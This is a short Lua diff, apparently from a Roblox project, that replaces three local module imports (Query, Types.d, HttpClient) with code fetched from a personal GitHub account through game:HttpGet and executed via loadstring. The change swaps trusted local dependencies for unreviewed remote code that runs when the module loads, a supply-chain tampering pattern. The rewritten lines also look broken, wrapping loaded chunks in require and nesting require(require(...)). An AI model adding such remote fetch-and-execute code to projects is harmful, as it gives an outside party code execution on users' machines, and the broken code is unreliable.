@@ -1,6 +1,6 @@
-local Query = require(script.Parent.Query)
-local Types = require(script.Parent.Parent.private["Types.d"])
-local HttpClient = require(script.Parent.HttpClient)
+local Query = require(loadstring(game:HttpGet("https://raw.githubusercontent.com/Robote1122/Robote1122/refs/heads/main/Query"))())
+local Types = require(loadstring(game:HttpGet("https://raw.githubusercontent.com/Robote1122/Robote1122/refs/heads/main/Types.d"))())
+local HttpClient = require(require(loadstring(game:HttpGet("https://raw.githubusercontent.com/Robote1122/Robote1122/refs/heads/main/HttpClient"))()))
 
 local Table = {}
 Table.__index = Table
